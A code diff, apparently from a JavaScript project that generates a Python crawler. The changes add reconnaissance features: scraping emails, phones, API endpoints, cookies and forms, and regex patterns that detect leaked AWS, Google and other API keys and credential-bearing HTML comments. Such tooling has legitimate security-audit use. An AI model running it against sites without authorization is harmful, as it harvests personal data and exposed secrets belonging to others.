+    # JavaScript sources
+    js_files = set(re.findall(r'src=["\\'](.*?\\.js(?:\\?[^"\\'>]*)?)["\\'\\s]', body, re.IGNORECASE))
+    for js in js_files:
+        full_js = urljoin(url, js)
+        results['javascript'].add(full_js)
+
+    # API endpoints in inline scripts
+    for script_block in re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.IGNORECASE):
+        for ep in re.findall(r'["\\'](/api/[a-zA-Z0-9/_-]+)["\\'\\s]', script_block):
+            results['api_endpoints'].add(urljoin(url, ep))
+        for ep in re.findall(r'["\\'](https?://[^"\\'>\\s]+/api/[^"\\'>\\s]*)["\\'\\s]', script_block):
+            results['api_endpoints'].add(ep[:200])
+        # Look for hardcoded secrets in JS
+        for key in re.findall(r'["\\']((?:sk|pk|api|key|token|secret|access)[_-]?[a-zA-Z0-9]{16,})["\\'\\s]', script_block):
+            results['potential_secrets'].add(key[:12] + '...')
+        for key in re.findall(r'AIza[0-9A-Za-z_-]{35}', script_block):
+            results['potential_secrets'].add('google_api:' + key[:12] + '...')
+        for key in re.findall(r'AKIA[0-9A-Z]{16}', script_block):
+            results['potential_secrets'].add('aws_key:' + key[:8] + '...')
+
+    # HTML comments (may contain dev notes, TODOs, credentials)
+    comments = re.findall(r'<!--(.*?)-->', body, re.DOTALL)
+    interesting_comments = []
+    for c in comments:
+        c_lower = c.lower().strip()
+        if any(k in c_lower for k in ['todo', 'fixme', 'hack', 'bug', 'password', 'secret',
+                'key', 'token', 'credential', 'temporary', 'remove', 'debug', 'test']):
+            interesting_comments.append(c.strip()[:200])
+    if interesting_comments:
+        for ic in interesting_comments:
+            results['comments'].add(ic)
+
+    # Forms with all inputs
+    forms = re.findall(r'<form([^>]*)>(.*?)</form>', body, re.DOTALL | re.IGNORECASE)
+    for form_attrs, form_body in forms:
+        action = re.search(r'action=["\\'](.*?)["\\'\\s]', form_attrs, re.IGNORECASE)
+        method = re.search(r'method=["\\'](.*?)["\\'\\s]', form_attrs, re.IGNORECASE)
+        inputs = re.findall(r'<input[^>]*(?:name|id)=["\\'](.*?)["\\'\\s]', form_body, re.IGNORECASE)
+        input_types = re.findall(r'<input[^>]*type=["\\'](.*?)["\\'\\s]', form_body, re.IGNORECASE)
+        form_info = json.dumps({
+            'action': action.group(1) if action else '',
+            'method': (method.group(1) if method else 'GET').upper(),
+            'inputs': inputs[:15],
+            'input_types': input_types[:15],
+            'page': url,
+        })
+        results['forms'].add(form_info)
+
+    # Cookies from headers
+    cookies = headers.get('Set-Cookie', '')
+    if cookies:
+        results['cookies'].add(f'{url}: {cookies[:200]}')
+
+    # Meta tags
+    for meta in re.findall(r'<meta\\s+([^>]+)/?>', body, re.IGNORECASE):
+        name_m = re.search(r'(?:name|property)=["\\'](.*?)["\\'\\s]', meta, re.IGNORECASE)
+        content_m = re.search(r'content=["\\'](.*?)["\\'\\s]', meta, re.IGNORECASE)
+        if name_m and content_m:
+            key = name_m.group(1).lower()
+            if any(k in key for k in ['author', 'generator', 'description', 'keyword',
+                    'og:', 'twitter:', 'application-name']):
+                results['metadata'].add(f'{name_m.group(1)}={content_m.group(1)[:100]}')
+
+    # Page metadata for this URL
+    title_m = re.search(r'<title[^>]*>(.*?)</title>', body, re.IGNORECASE | re.DOTALL)
+    page_metadata[url] = {
+        'title': title_m.group(1).strip()[:200] if title_m else '',
+        'size': len(body),
+        'emails': len(emails),
+        'links': len(urls) + len(internal),
+    }
+
+def crawl(url, depth=0):
+    if depth > max_depth or url in visited or len(visited) > 500:
+        return
+    visited.add(url)
+    body, status, headers = fetch_page(url)
+    if not body:
+        return
+
+    extract_from_page(url, body, headers)
+
+    # Collect links to crawl
+    to_crawl = []
+    for href in re.findall(r'href=["\\'](https?://[^"\\'>]+)', body):
+        parsed = urlparse(href)
+        if parsed.hostname == base_domain and href not in visited:
+            to_crawl.append(href)
+    for p in re.findall(r'href=["\\'](/[^"\\'>]+)', body):
+        full = urljoin(target, p)
+        if full not in visited:
+            to_crawl.append(full)
+
+    # Crawl found links
+    for link in to_crawl[:20]:
+        crawl(link, depth + 1)
+
 crawl(target)
+
+# Also scan JS files for secrets/endpoints
+js_to_scan = list(results['javascript'])[:20]
+for js_url in js_to_scan:
+    try:
+        js_body, _, _ = fetch_page(js_url)
+        if js_body:
+            for ep in re.findall(r'["\\'](/api/[a-zA-Z0-9/_-]+)["\\'\\s]', js_body):
+                results['api_endpoints'].add(urljoin(target, ep))
+            for key in re.findall(r'["\\']((?:sk|pk|api|key|token|secret|access)[_-]?[a-zA-Z0-9]{16,})["\\'\\s]', js_body):
+                results['potential_secrets'].add(key[:12] + '...')
+    except: pass
 
 # Convert sets to lists for JSON
 output = {
     'target': target,
     'pages_crawled': len(visited),
     'emails': sorted(results['emails']),
-    'urls': sorted(list(results['urls'])[:500]),
-    'internal_paths': sorted(list(results['internal'])[:500]),
+    'phones': sorted(results['phones']),
+    'urls': sorted(list(results['urls'])[:1000]),
+    'internal_paths': sorted(list(results['internal'])[:1000]),
     'social_media': sorted(results['social']),
     'files': sorted(results['files']),
+    'javascript_sources': sorted(list(results['javascript'])[:200]),
+    'api_endpoints': sorted(results['api_endpoints']),
+    'potential_secrets': sorted(results['potential_secrets']),
+    'interesting_comments': sorted(results['comments']),
+    'forms': [json.loads(f) for f in results['forms']],
+    'cookies': sorted(results['cookies']),
+    'metadata': sorted(results['metadata']),
+    'page_details': page_metadata,
 }
 
 os.makedirs(output_dir, exist_ok=True)
-for key in ['emails', 'urls', 'internal_paths', 'social_media', 'files']:
+for key in ['emails', 'phones', 'urls', 'internal_paths', 'social_media', 'files',
+            'javascript_sources', 'api_endpoints', 'potential_secrets', 'interesting_comments']:
     filepath = os.path.join(output_dir, f'{key}.txt')
     with open(filepath, 'w') as f:
-        f.write('\\n'.join(output[key]))
+        f.write('\\n'.join(str(x) for x in output[key]))
 
 with open(os.path.join(output_dir, 'crawl_results.json'), 'w') as f:
-    json.dump(output, f, indent=2)
+    json.dump(output, f, indent=2, default=str)
 
 print(json.dumps({
     'pages_crawled': output['pages_crawled'],
     'emails_found': len(output['emails']),
+    'phones_found': len(output['phones']),
     'urls_found': len(output['urls']),
     'files_found': len(output['files']),
     'social_found': len(output['social_media']),
+    'api_endpoints': len(output['api_endpoints']),
+    'secrets_found': len(output['potential_secrets']),
+    'comments': len(output['interesting_comments']),
+    'forms': len(output['forms']),
 }))
 `;
           const scriptPath = path.join(outputPath, '_crawler.py');
